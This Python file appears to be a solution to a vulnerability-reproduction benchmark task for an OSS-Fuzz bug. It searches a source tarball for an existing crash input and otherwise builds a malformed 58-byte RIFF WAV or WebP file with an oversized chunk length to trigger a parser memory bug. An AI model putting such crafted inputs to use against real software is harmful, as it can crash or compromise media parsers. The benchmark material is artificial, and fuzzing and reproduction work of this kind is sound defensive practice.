import tarfile
import re
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        bug_id = "382816119"
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return self._generic_riff_poc("wav")
        with tf:
            poc = self._find_binary_poc(tf, bug_id)
            if poc is not None:
                return poc
            poc = self._find_text_encoded_poc(tf, bug_id)
            if poc is not None:
                return poc
            poc = self._find_any_ossfuzz_riff(tf)
            if poc is not None:
                return poc
            project_type = self._guess_project_type(tf)
            return self._generic_riff_poc(project_type)

    def _find_binary_poc(self, tf: tarfile.TarFile, bug_id: str) -> bytes | None:
        candidates = []
        ground_len = 58
        for member in tf.getmembers():
            if not member.isfile():
                continue
            name_lower = member.name.lower()
            if bug_id in name_lower:
                try:
                    f = tf.extractfile(member)
                except Exception:
                    continue
                if not f:
                    continue
                try:
                    data = f.read()
                except Exception:
                    continue
                if not data:
                    continue
                candidates.append((member.name, data))
        if not candidates:
            return None

        def score(item):
            data = item[1]
            riff_penalty = 0 if data.startswith(b"RIFF") else 1000
            return (riff_penalty, abs(len(data) - ground_len), len(data))

        candidates.sort(key=score)
        return candidates[0][1]

    def _find_text_encoded_poc(self, tf: tarfile.TarFile, bug_id: str) -> bytes | None:
        text_exts = {
            ".c",
            ".cc",
            ".cpp",
            ".cxx",
            ".h",
            ".hpp",
            ".hh",
            ".txt",
            ".md",
            ".inc",
            ".ipp",
            ".c++",
            ".h++",
            ".java",
            ".rs",
            ".go",
        }
        arr_candidates: list[bytes] = []
        str_candidates: list[bytes] = []

        for member in tf.getmembers():
            if not member.isfile():
                continue
            name_lower = member.name.lower()
            dot = name_lower.rfind(".")
            ext = name_lower[dot:] if dot != -1 else ""
            if ext not in text_exts:
                continue
            try:
                f = tf.extractfile(member)
            except Exception:
                continue
            if not f:
                continue
            try:
                text = f.read().decode("utf-8", errors="ignore")
            except Exception:
                continue
            if bug_id not in text:
                continue

            arr_bytes = self._extract_int_array_near_bugid(text, bug_id)
            if arr_bytes:
                arr_candidates.append(arr_bytes)

            str_bytes = self._extract_c_string_near_bugid(text, bug_id)
            if str_bytes:
                str_candidates.append(str_bytes)

        candidates = arr_candidates + str_candidates
        if not candidates:
            return None

        best = min(candidates, key=self._score_poc_candidate)
        return best

    def _extract_int_array_near_bugid(self, text: str, bug_id: str) -> bytes | None:
        idx = text.find(bug_id)
        if idx == -1:
            return None
        search_limit = 20000

        brace_start = text.find("{", idx)
        if brace_start == -1 or brace_start - idx > search_limit:
            brace_start_alt = text.rfind("{", 0, idx)
            if brace_start_alt == -1 or idx - brace_start_alt > search_limit:
                return None
            brace_start = brace_start_alt

        brace_end = text.find("};", brace_start)
        if brace_end == -1 or brace_end - brace_start > search_limit:
            brace_end_alt = text.find("}", brace_start + 1)
            if brace_end_alt == -1 or brace_end_alt - brace_start > search_limit:
                return None
            brace_end = brace_end_alt

        snippet = text[brace_start + 1 : brace_end]
        data = self._parse_int_array_snippet(snippet)
        if data and len(data) >= 4:
            return data
        return None

    def _parse_int_array_snippet(self, snippet: str) -> bytes:
        nums = []
        for m in re.finditer(r"0x[0-9a-fA-F]+|\d+", snippet):
            token = m.group(0)
            try:
                val = int(token, 0)
            except ValueError:
                continue
            nums.append(val & 0xFF)
        if not nums:
            return b""
        return bytes(nums)

    def _extract_c_string_near_bugid(self, text: str, bug_id: str) -> bytes | None:
        idx = text.find(bug_id)
        if idx == -1:
            return None
        window_start = max(0, idx - 5000)
        window_end = min(len(text), idx + 20000)
        window = text[window_start:window_end]

        best: bytes | None = None

        pattern_hex = re.compile(r'"([^"]*\\x[0-9a-fA-F]{2}[^"]*)"', re.DOTALL)
        for m in pattern_hex.finditer(window):
            content = m.group(1)
            data = self._parse_c_string_content(content)
            if data:
                if best is None or self._score_poc_candidate(data) < self._score_poc_candidate(best):
                    best = data

        if best:
            return best

        pattern_riff = re.compile(r'"(RIFF[^"]*)"')
        for m in pattern_riff.finditer(window):
            content = m.group(1)
            data = self._parse_c_string_content(content)
            if data:
                return data

        return None

    def _parse_c_string_content(self, s: str) -> bytes:
        try:
            decoded = s.encode("utf-8").decode("unicode_escape")
            return decoded.encode("latin1", errors="ignore")
        except Exception:
            return b""

    def _score_poc_candidate(self, data: bytes) -> tuple[int, int, int]:
        ground_len = 58
        riff_penalty = 0 if data.startswith(b"RIFF") else 1000
        return (riff_penalty, abs(len(data) - ground_len), len(data))

    def _find_any_ossfuzz_riff(self, tf: tarfile.TarFile) -> bytes | None:
        candidates: list[bytes] = []

        for member in tf.getmembers():
            if not member.isfile():
                continue
            name_lower = member.name.lower()
            if "oss-fuzz" in name_lower or "clusterfuzz" in name_lower:
                try:
                    f = tf.extractfile(member)
                except Exception:
                    continue
                if not f:
                    continue
                try:
                    header = f.read(12)
                except Exception:
                    continue
                if not header:
                    continue
                if header.startswith(b"RIFF"):
                    try:
                        f_full = tf.extractfile(member)
                    except Exception:
                        continue
                    if not f_full:
                        continue
                    data = f_full.read()
                    if data:
                        candidates.append(data)

        if not candidates:
            for member in tf.getmembers():
                if not member.isfile():
                    continue
                name_lower = member.name.lower()
                if "test" in name_lower or "fuzz" in name_lower or "corpus" in name_lower:
                    if member.size <= 0 or member.size > 1024:
                        continue
                    try:
                        f = tf.extractfile(member)
                    except Exception:
                        continue
                    if not f:
                        continue
                    try:
                        header = f.read(12)
                    except Exception:
                        continue
                    if not header:
                        continue
                    if header.startswith(b"RIFF"):
                        try:
                            f_full = tf.extractfile(member)
                        except Exception:
                            continue
                        if not f_full:
                            continue
                        data = f_full.read()
                        if data:
                            candidates.append(data)

        if not candidates:
            return None

        best = min(candidates, key=self._score_poc_candidate)
        return best

    def _guess_project_type(self, tf: tarfile.TarFile) -> str:
        root_names = set()
        for member in tf.getmembers():
            name = member.name
            if "/" in name:
                root = name.split("/", 1)[0]
            else:
                root = name
            root_names.add(root)
            if len(root_names) > 20:
                break
        combined = " ".join(root_names).lower()
        if "webp" in combined:
            return "webp"
        if "sndfile" in combined or "wav" in combined or "audiofile" in combined or "wavpack" in combined or "dr_wav" in combined:
            return "wav"
        if "avi" in combined or "riff" in combined:
            return "avi"
        return "wav"

    def _generic_riff_poc(self, project_type: str) -> bytes:
        target_len = 58
        if project_type == "webp":
            data = bytearray(b"RIFF\x00\x00\x00\x00WEBP")
            data += b"VP8 "
            data += struct.pack("<I", 0x7FFFFFFF)
            data += b"/" * 20
            size = len(data) - 8
            data[4:8] = struct.pack("<I", size)
            if len(data) > target_len:
                data = data[:target_len]
                size = len(data) - 8
                data[4:8] = struct.pack("<I", size)
            elif len(data) < target_len:
                data += b"\x00" * (target_len - len(data))
                size = len(data) - 8
                data[4:8] = struct.pack("<I", size)
            return bytes(data)
        else:
            data = bytearray()
            data += b"RIFF"
            data += b"\x00\x00\x00\x00"
            data += b"WAVE"
            data += b"fmt "
            data += struct.pack("<I", 0x7FFFFFFF)
            data += b"\x01\x00"
            data += b"\x01\x00"
            data += struct.pack("<I", 8000)
            data += struct.pack("<I", 8000 * 2)
            data += b"\x02\x00"
            data += b"\x10\x00"
            size = len(data) - 8
            data[4:8] = struct.pack("<I", size)
            if len(data) > target_len:
                data = data[:target_len]
                size = len(data) - 8
                data[4:8] = struct.pack("<I", size)
            elif len(data) < target_len:
                data += b"\x00" * (target_len - len(data))
                size = len(data) - 8
                data[4:8] = struct.pack("<I", size)
            return bytes(data)
